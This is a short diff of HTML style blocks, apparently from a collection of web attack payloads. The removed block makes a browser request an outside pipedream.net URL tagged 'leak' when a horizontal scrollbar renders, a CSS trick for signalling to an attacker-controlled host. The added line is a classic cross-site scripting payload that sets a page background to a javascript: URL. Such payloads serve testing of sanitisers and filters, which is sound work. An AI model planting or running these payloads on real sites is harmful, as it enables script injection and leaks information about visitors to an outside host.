@@ -1,5 +1,1 @@
-<style>
-body { white-space: nowrap }; 
-body::-webkit-scrollbar { background: blue; }
-body::-webkit-scrollbar:horizontal { background: url(https://eoyrdicds9j0wbn.m.pipedream.net?leak); }
-</style>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
